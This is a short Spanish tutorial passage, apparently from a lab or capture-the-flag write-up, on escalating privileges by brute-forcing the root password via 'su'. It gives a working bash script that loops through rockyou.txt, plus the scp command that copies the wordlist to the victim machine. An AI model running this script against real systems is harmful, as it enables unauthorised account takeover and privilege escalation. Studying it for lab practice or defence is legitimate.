Podemos hacer fuerza bruta con los usuarios que están registrados en el equipo local con el fin de escalar privilegios, para ello haremos uso de bash scripting y del diccionario `rockyou.txt`.
Primero que nada debemos traernos el diccionario a la máquina víctima, ya sea montando un servidor `http` con python en nuestra máquina atacante o por ssh haciendo uso delcomando `scp`.

```
scp /usr/share/SecLists/rockyou.txt balutin@172.17.0.3:/tmp/
```

Y ahora, en el directorio `tmp`, haremos uso del siguiente script en bash:

```
#!/bin/bash  
echo "[*] Iniciando fuerza bruta contra 'su' con rockyou.txt"  
echo "[*] Diccionario: rockyou.txt"  
echo "[*] Esto puede tomar tiempo..."  
echo ""  
  
counter=0  
while IFS= read -r password; do  
    counter=$((counter + 1))  
      
    # Mostrar progreso cada 1000 intentos  
    if [ $((counter % 1000)) -eq 0 ]; then  
        echo "[*] Intentos realizados: $counter"  
    fi  
      
    # Probar la contraseña  
    echo "$password" | timeout 2 su -c 'echo "SUCCESS"' 2>/dev/null | grep -q "SUCCESS"  
      
    if [ $? -eq 0 ]; then  
        echo ""  
        echo "[+] ¡CONTRASEÑA DE ROOT ENCONTRADA!"  
        echo "[+] Contraseña: $password"  
        echo "[+] Intentos realizados: $counter"  
        exit 0  
    fi  
      
done < rockyou.txt  
  
echo "[-] Fuerza bruta completada. No se encontró la contraseña."  
echo "[-] Total de intentos: $counter"
```

```
nano bruteForce.sh
//pega el script
chmod +x bruteForce.sh
./bruteForce.sh
```

![[Pasted image 20250715193616.png]]

